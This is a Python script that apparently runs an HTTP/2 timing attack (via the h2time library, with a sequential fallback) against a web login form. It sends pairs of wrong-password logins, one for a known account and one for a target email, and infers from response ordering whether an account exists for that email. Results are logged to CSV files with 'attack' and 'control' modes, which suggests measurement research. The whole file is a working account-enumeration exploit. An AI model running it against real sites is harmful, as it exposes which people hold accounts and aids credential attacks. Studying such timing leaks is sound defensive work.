from h2time import H2Time, H2Request
import asyncio
import random
import string
import os
import sys
import requests
import time

def measure_response_time(url, data=None, headers=None, cert_path='/etc/ca-certificates/trust-source/anchors/myCA.crt'):
    start_time = time.time_ns()  # Start time in nanoseconds
    response = requests.post(
        url, 
        data=data,
        headers=headers,
        verify=cert_path,        
    )
    # print(response.text)
    end_time = time.time_ns()    # End time in nanoseconds
    elapsed_time_ns = end_time - start_time
    # elapsed_time = elapsed_time_ns / 1_000_000_000  # Convert to seconds
    return elapsed_time_ns, response.status_code

# def run_timing_attack(target_url, attempts=10, data=None):
#     times = []
#     for _ in range(attempts):
#         elapsed_time, status_code = measure_response_time(target_url, data=data)
#         print(f"Request took {elapsed_time:.6f} seconds, status code: {status_code}")
#         times.append(elapsed_time)
#     return times

async def attack():
    target_url = sys.argv[1]
    known_account_email = sys.argv[2] # We know an account exists with this email (we don't need to know the password)
    target_account_email = sys.argv[3] # We want to know if an account exists with this email
    target_location = sys.argv[4] # "local" | "remote"
    activity_type = sys.argv[5] # "attack" | "control"
    attack_style = sys.argv[6] # "concurrent" | "sequential"

    detail_file = open("results/" + target_location + "_" + activity_type + "_detail.csv", "a")
    winners_file = open("results/" + target_location + "_" + activity_type + "_winners.csv", "a")

    # This must be the email that you as the hacker want to test if exists on the site
    if activity_type == "control":
        post_data = 'password=12345789abc&email=' + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6)) + '@ephort.dk'
    else:
        post_data = 'password=12345789abc&email=' + target_account_email

    # This has to be the email known by the hacker to be existing on the site. But the password must be wrong.
    post_data2 = 'password=12345789abc&email=' + known_account_email
    
    headers = {
        'content-length': str(len(post_data)),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    headers2 = {
        'content-length': str(len(post_data2)),
        'Content-Type': 'application/x-www-form-urlencoded'
    }

    r1 = H2Request('POST', target_url, headers, post_data)
    r2 = H2Request('POST', target_url, headers2, post_data2)
    
    num_request_pairs = 5
    
    safety_margin = num_request_pairs / 5
    
    if (attack_style == "sequential"):
        results = []
        for i in range(num_request_pairs):
            timings = measure_response_time(target_url, data=post_data, headers=headers)
            timings2 = measure_response_time(target_url, data=post_data2, headers=headers2)
            results.append(
                (
                    str(timings2[0] - timings[0]), # The time diff
                    str(timings[1]), # one http code
                    str(timings2[1]) # another http code
                )
            )
        
    else:
        async with H2Time(r1, r2, num_request_pairs=num_request_pairs, num_padding_params=40, sequential=True, inter_request_time_ms=10, timeout=50) as h2t:            
            results = await h2t.run_attack()
    # print(results)
    output = '\n'.join(map(lambda x: ','.join(map(str, x)), results))

    num = output.count('-')
    print(output)
    # print((num / num_request_pairs) * 100)
    if ((num - (num_request_pairs/2)) > safety_margin):
        #print("Request 1 is likely winner (response received last from server in %s of the request pairs)" % (num))
        # print(post_data)
        winner = "1"
    elif ((num - (num_request_pairs/2)) < -safety_margin):
        #print("Request 2 is likely winner (response received last from server in %s of the request pairs)" % (num_request_pairs-num))
        winner = "2"
    else:      
        winner = "0"
        #print("Could not determine winner. Even distributed with %s responses that came in with response 1 last" % (num))

    # print(winner)

    detail_file.write(output + "\n")
    winners_file.write(winner + "\n")

    detail_file.close()
    winners_file.close()

loop = asyncio.get_event_loop()
loop.run_until_complete(attack())
loop.close()
